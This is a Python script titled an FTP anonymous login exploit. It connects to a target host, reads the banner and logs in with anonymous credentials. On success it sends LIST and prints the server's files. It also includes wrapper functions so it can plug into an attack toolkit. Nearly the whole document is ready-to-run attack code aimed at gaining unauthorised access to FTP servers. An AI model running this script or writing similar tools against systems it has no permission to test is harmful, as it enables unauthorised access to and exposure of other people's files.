#!/usr/bin/env python3
"""
FTP Anonymous Login Exploit
- Real FTP connection
- Anonymous authentication attempt
- File listing capability
"""

import socket
import sys
import time
from tqdm import tqdm

def run_exploit(target, port=21):
    """
    Attempt anonymous FTP login and list files
    """
    print(f"[*] Starting FTP anonymous exploit on {target}:{port}")
    
    # Progress bar untuk proses exploit
    with tqdm(total=100, desc="FTP Exploit", ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}") as pbar:
        try:
            pbar.set_description("Connecting to FTP")
            pbar.update(10)
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            
            pbar.set_description("Receiving banner")
            pbar.update(20)
            
            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            print(f"\n[+] FTP Banner: {banner}")
            
            pbar.set_description("Anonymous login")
            pbar.update(30)
            
            # Attempt anonymous login
            print("[*] Attempting anonymous login...")
            sock.send(b"USER anonymous\r\n")
            user_response = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            print(f"[+] USER response: {user_response}")
            
            sock.send(b"PASS anonymous@\r\n")
            pass_response = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            print(f"[+] PASS response: {pass_response}")
            
            pbar.set_description("Checking access")
            pbar.update(20)
            
            # Check if login successful
            if "230" in pass_response:
                print("[SUCCESS] Anonymous login successful!")
                
                pbar.set_description("Listing files")
                pbar.update(10)
                
                # List files
                print("[*] Attempting to list files...")
                sock.send(b"LIST\r\n")
                list_response = sock.recv(4096).decode('utf-8', errors='ignore')
                print(f"[+] Files listing:\n{list_response}")
                
                pbar.set_description("Getting info")
                pbar.update(10)
                
                result = "SUCCESS - Anonymous access granted"
                
            else:
                print("[FAILED] Anonymous login failed")
                result = "FAILED - Anonymous access denied"
            
            pbar.update(100 - pbar.n)  # Complete to 100%
            
            # Cleanup
            sock.send(b"QUIT\r\n")
            sock.close()
            return result
            
        except socket.timeout:
            pbar.set_description("Timeout")
            pbar.update(100 - pbar.n)
            print("\n[ERROR] Connection timeout")
            return "ERROR - Connection timeout"
        except ConnectionRefusedError:
            pbar.set_description("Refused")
            pbar.update(100 - pbar.n)
            print("\n[ERROR] Connection refused")
            return "ERROR - Connection refused"
        except Exception as e:
            pbar.set_description("Error")
            pbar.update(100 - pbar.n)
            print(f"\n[ERROR] {e}")
            return f"ERROR - {e}"

# Compatibility functions
def exploit(target):
    return run_exploit(target)

def main(target):
    return run_exploit(target)

def run(target):
    return run_exploit(target)

# Test if run directly
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"
    result = run_exploit(target)
    print(f"\nFinal result: {result}")
